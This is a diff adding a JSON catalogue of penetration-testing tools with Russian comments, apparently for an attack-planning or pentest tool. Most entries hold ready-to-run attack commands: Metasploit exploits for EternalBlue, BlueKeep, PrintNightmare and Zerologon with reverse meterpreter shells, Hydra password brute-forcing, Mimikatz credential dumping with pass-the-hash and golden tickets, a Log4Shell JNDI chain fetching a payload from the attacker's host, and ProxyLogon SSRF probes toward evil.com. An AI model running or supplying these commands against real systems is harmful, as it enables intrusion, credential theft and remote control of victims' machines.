@@ -1,0 +1,389 @@
+[
+  {
+    "id": "TOOL-001",
+    "name": "Metasploit Framework",
+    "type": "exploitation",
+    "description": "Мощная платформа для разработки и выполнения эксплойтов",
+    "url": "https://www.metasploit.com/",
+    "applicable_attack_types": ["remote_code_execution", "privilege_escalation", "brute_force"],
+    "applicable_cve": ["CVE-2017-0144", "CVE-2019-0708", "CVE-2021-44228", "CVE-2021-34527", "CVE-2020-1472"],
+    "commands": {
+      "CVE-2017-0144": [
+        "# EternalBlue (MS17-010) через Metasploit",
+        "msfconsole -q",
+        "use exploit/windows/smb/ms17_010_eternalblue",
+        "set RHOSTS <TARGET_IP>",
+        "set LHOST <YOUR_IP>",
+        "set LPORT 4444",
+        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+        "run"
+      ],
+      "CVE-2019-0708": [
+        "# BlueKeep RDP RCE через Metasploit",
+        "msfconsole -q",
+        "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+        "set RHOSTS <TARGET_IP>",
+        "set LHOST <YOUR_IP>",
+        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+        "run"
+      ],
+      "CVE-2021-34527": [
+        "# PrintNightmare через Metasploit",
+        "msfconsole -q",
+        "use exploit/windows/dcerpc/cve_2021_1675_printspooler",
+        "set RHOSTS <TARGET_IP>",
+        "set LHOST <YOUR_IP>",
+        "set SMBUSER <USERNAME>",
+        "set SMBPASS <PASSWORD>",
+        "run"
+      ],
+      "CVE-2020-1472": [
+        "# Zerologon через Metasploit",
+        "msfconsole -q",
+        "use auxiliary/admin/dcerpc/cve_2020_1472_zerologon",
+        "set RHOSTS <DC_IP>",
+        "set NBNAME <DOMAIN_CONTROLLER_NAME>",
+        "run"
+      ]
+    },
+    "phases": ["Scanning", "Exploitation", "Post-Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-002",
+    "name": "Nmap",
+    "type": "scanning",
+    "description": "Утилита сетевого сканирования и обнаружения уязвимостей",
+    "url": "https://nmap.org/",
+    "applicable_attack_types": ["reconnaissance", "network_scanning"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Быстрое сканирование портов",
+        "nmap -sV -sC -O <TARGET_IP>",
+        "",
+        "# Агрессивное сканирование",
+        "nmap -A -T4 <TARGET_IP>",
+        "",
+        "# Поиск уязвимостей с помощью NSE-скриптов",
+        "nmap --script vuln <TARGET_IP>",
+        "",
+        "# Сканирование конкретного порта",
+        "nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>",
+        "",
+        "# Сканирование диапазона портов",
+        "nmap -p 1-65535 -sV <TARGET_IP>"
+      ]
+    },
+    "phases": ["Reconnaissance", "Scanning"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-003",
+    "name": "SQLmap",
+    "type": "exploitation",
+    "description": "Автоматизированный инструмент для обнаружения и эксплуатации SQL-инъекций",
+    "url": "https://sqlmap.org/",
+    "applicable_attack_types": ["sql_injection"],
+    "applicable_cve": ["CVE-GENERIC-SQLI"],
+    "commands": {
+      "CVE-GENERIC-SQLI": [
+        "# Базовое тестирование SQL-инъекции",
+        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" --dbs",
+        "",
+        "# Получение всех таблиц базы данных",
+        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -D <DB_NAME> --tables",
+        "",
+        "# Дамп конкретной таблицы",
+        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -D <DB_NAME> -T <TABLE_NAME> --dump",
+        "",
+        "# Попытка получить OS shell",
+        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" --os-shell",
+        "",
+        "# Тестирование POST-запроса",
+        "sqlmap -u \"http://<TARGET_IP>/login\" --data=\"user=admin&pass=test\" --dbs"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-004",
+    "name": "Hydra",
+    "type": "brute_force",
+    "description": "Быстрый онлайн-инструмент для перебора паролей (brute force)",
+    "url": "https://github.com/vanhauser-thc/thc-hydra",
+    "applicable_attack_types": ["brute_force"],
+    "applicable_cve": ["CVE-GENERIC-BRUTEFORCE-RDP", "CVE-GENERIC-BRUTEFORCE-FTP", "CVE-GENERIC-BRUTEFORCE-SSH"],
+    "commands": {
+      "CVE-GENERIC-BRUTEFORCE-RDP": [
+        "# Brute Force RDP (порт 3389)",
+        "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>",
+        "",
+        "# Со списком логинов",
+        "hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>:3389"
+      ],
+      "CVE-GENERIC-BRUTEFORCE-FTP": [
+        "# Brute Force FTP (порт 21)",
+        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
+        "",
+        "# С задержкой между попытками",
+        "hydra -l admin -P passwords.txt -t 4 -W 3 ftp://<TARGET_IP>"
+      ],
+      "CVE-GENERIC-BRUTEFORCE-SSH": [
+        "# Brute Force SSH (порт 22)",
+        "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
+        "",
+        "# С задержкой для обхода блокировки",
+        "hydra -l admin -P passwords.txt -t 4 -W 5 ssh://<TARGET_IP>"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-005",
+    "name": "Burp Suite",
+    "type": "web_testing",
+    "description": "Комплексная платформа тестирования безопасности веб-приложений",
+    "url": "https://portswigger.net/burp",
+    "applicable_attack_types": ["cross_site_scripting", "sql_injection", "remote_code_execution"],
+    "applicable_cve": ["CVE-GENERIC-XSS", "CVE-GENERIC-SQLI"],
+    "commands": {
+      "CVE-GENERIC-XSS": [
+        "# Запуск Burp Suite как прокси",
+        "# 1. Запустите Burp Suite Community/Professional",
+        "# 2. Настройте браузер на прокси 127.0.0.1:8080",
+        "# 3. Перехватывайте и модифицируйте запросы",
+        "",
+        "# XSS тест-полезная нагрузка для ручного ввода:",
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "\"><svg onload=alert(1)>",
+        "';alert('XSS');//"
+      ],
+      "CVE-GENERIC-SQLI": [
+        "# SQL инъекция через Burp Intruder:",
+        "# 1. Перехватите запрос с параметром",
+        "# 2. Отправьте в Intruder",
+        "# 3. Используйте полезные нагрузки SQL:",
+        "' OR 1=1--",
+        "' OR '1'='1",
+        "1; DROP TABLE users--",
+        "' UNION SELECT 1,2,3--"
+      ]
+    },
+    "phases": ["Reconnaissance", "Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-006",
+    "name": "Mimikatz",
+    "type": "post_exploitation",
+    "description": "Инструмент для извлечения учётных данных из памяти Windows",
+    "url": "https://github.com/gentilkiwi/mimikatz",
+    "applicable_attack_types": ["credential_dumping", "privilege_escalation"],
+    "applicable_cve": ["CVE-2020-1472", "CVE-2021-34527", "CVE-2023-23397"],
+    "commands": {
+      "default": [
+        "# Запуск Mimikatz с правами администратора",
+        "privilege::debug",
+        "sekurlsa::logonpasswords",
+        "",
+        "# Извлечение хешей NTLM из SAM",
+        "lsadump::sam",
+        "",
+        "# Дамп LSA секретов",
+        "lsadump::secrets",
+        "",
+        "# Pass-the-Hash атака",
+        "sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe",
+        "",
+        "# Golden Ticket (требуется hash krbtgt)",
+        "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /id:500"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Windows"]
+  },
+  {
+    "id": "TOOL-007",
+    "name": "impacket / zerologon",
+    "type": "exploitation",
+    "description": "Python-библиотека для работы с сетевыми протоколами Windows + exploit Zerologon",
+    "url": "https://github.com/SecureAuthCorp/impacket",
+    "applicable_attack_types": ["privilege_escalation"],
+    "applicable_cve": ["CVE-2020-1472"],
+    "commands": {
+      "CVE-2020-1472": [
+        "# Установка impacket",
+        "pip install impacket",
+        "",
+        "# Проверка уязвимости Zerologon",
+        "python3 zerologon_tester.py <DC_HOSTNAME> <DC_IP>",
+        "",
+        "# Эксплуатация — сброс пароля DC",
+        "python3 cve-2020-1472-exploit.py <DC_HOSTNAME> <DC_IP>",
+        "",
+        "# После эксплуатации — дамп хешей через secretsdump",
+        "python3 secretsdump.py -no-pass -just-dc <DOMAIN>/<DC_HOSTNAME>\\$@<DC_IP>",
+        "",
+        "# Восстановление пароля (для учебной среды!)",
+        "python3 restorepassword.py <DOMAIN>/<DC_HOSTNAME>@<DC_IP> -target-ip <DC_IP> -hexpass <ORIGINAL_HASH>"
+      ]
+    },
+    "phases": ["Exploitation", "Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-008",
+    "name": "Log4Shell PoC",
+    "type": "exploitation",
+    "description": "Инструмент для тестирования уязвимости Log4Shell (CVE-2021-44228)",
+    "url": "https://github.com/woodpecker-appstore/log4j-payload-generator",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2021-44228"],
+    "commands": {
+      "CVE-2021-44228": [
+        "# Шаг 1: Запустите LDAP-сервер (marshalsec)",
+        "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://<YOUR_IP>:8888/#Exploit\"",
+        "",
+        "# Шаг 2: Создайте payload класс (Exploit.java)",
+        "# public class Exploit { static { try { Runtime.getRuntime().exec(\"calc.exe\"); } catch (Exception e) {} } }",
+        "javac Exploit.java",
+        "",
+        "# Шаг 3: Хостите класс на HTTP",
+        "python3 -m http.server 8888",
+        "",
+        "# Шаг 4: Отправьте JNDI payload в уязвимое поле",
+        "curl -H 'X-Api-Version: ${jndi:ldap://<YOUR_IP>:1389/Exploit}' http://<TARGET_IP>/",
+        "",
+        "# Альтернативный вектор — User-Agent",
+        "curl -A '${jndi:ldap://<YOUR_IP>:1389/Exploit}' http://<TARGET_IP>/"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-009",
+    "name": "PrintNightmare PoC (cube0x0)",
+    "type": "exploitation",
+    "description": "Эксплойт PrintNightmare для локального/удалённого выполнения кода",
+    "url": "https://github.com/cube0x0/CVE-2021-1675",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2021-34527"],
+    "commands": {
+      "CVE-2021-34527": [
+        "# Установка зависимостей",
+        "pip3 install impacket",
+        "",
+        "# Проверка уязвимости",
+        "rpcdump.py @<TARGET_IP> | grep -A 4 'MS-RPRN'",
+        "",
+        "# Создание вредоносной DLL (msfvenom)",
+        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f dll -o shell.dll",
+        "",
+        "# Хостим DLL через SMB (impacket)",
+        "python3 smbserver.py share . -smb2support",
+        "",
+        "# Запуск эксплойта",
+        "python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> '\\\\<YOUR_IP>\\share\\shell.dll'",
+        "",
+        "# Запуск Metasploit listener",
+        "msfconsole -q -x 'use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <YOUR_IP>; set LPORT 4444; run'"
+      ]
+    },
+    "phases": ["Exploitation", "Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-010",
+    "name": "ProxyLogon PoC",
+    "type": "exploitation",
+    "description": "Эксплойт цепочки уязвимостей ProxyLogon в Microsoft Exchange",
+    "url": "https://github.com/proxylogon/proxylogon",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2021-26855"],
+    "commands": {
+      "CVE-2021-26855": [
+        "# Проверка уязвимости через curl",
+        "curl -sk 'https://<TARGET_IP>/ecp/y.js' --header 'Cookie: X-BEResource=localhost~1942061522' | grep 'The resource cannot be found'",
+        "",
+        "# Использование готового PoC",
+        "python3 proxylogon.py --host <TARGET_IP> --email <VICTIM_EMAIL>",
+        "",
+        "# Ручная проверка SSRF (CVE-2021-26855)",
+        "curl -sk 'https://<TARGET_IP>/autodiscover/autodiscover.json?@evil.com/autodiscover/autodiscover.json%3F@evil.com' -v",
+        "",
+        "# После SSRF — запись веб-шелла (CVE-2021-27065)",
+        "# Требуется почтовый ящик жертвы и сессия SSRF"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Expert",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-011",
+    "name": "Nessus / OpenVAS",
+    "type": "vulnerability_scanner",
+    "description": "Профессиональные сканеры уязвимостей для комплексного аудита",
+    "url": "https://www.tenable.com/products/nessus",
+    "applicable_attack_types": ["reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# OpenVAS (бесплатная альтернатива) — установка на Kali",
+        "sudo apt install openvas",
+        "sudo gvm-setup",
+        "sudo gvm-start",
+        "",
+        "# Доступ к веб-интерфейсу OpenVAS",
+        "# https://127.0.0.1:9392",
+        "",
+        "# Nessus CLI сканирование (требует лицензии)",
+        "nessuscli scan new --name 'Scan' --policy 'Basic Network Scan' --targets '<TARGET_IP>'"
+      ]
+    },
+    "phases": ["Reconnaissance", "Scanning"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-012",
+    "name": "Wireshark / tcpdump",
+    "type": "network_analysis",
+    "description": "Инструменты анализа сетевого трафика",
+    "url": "https://www.wireshark.org/",
+    "applicable_attack_types": ["man_in_the_middle", "reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# tcpdump — захват трафика на интерфейсе",
+        "tcpdump -i eth0 -w capture.pcap",
+        "",
+        "# Фильтр по хосту и порту",
+        "tcpdump -i eth0 host <TARGET_IP> and port 445 -w smb.pcap",
+        "",
+        "# Захват HTTP трафика",
+        "tcpdump -i eth0 -A port 80",
+        "",
+        "# Wireshark — открыть захват",
+        "wireshark capture.pcap"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  }
+]
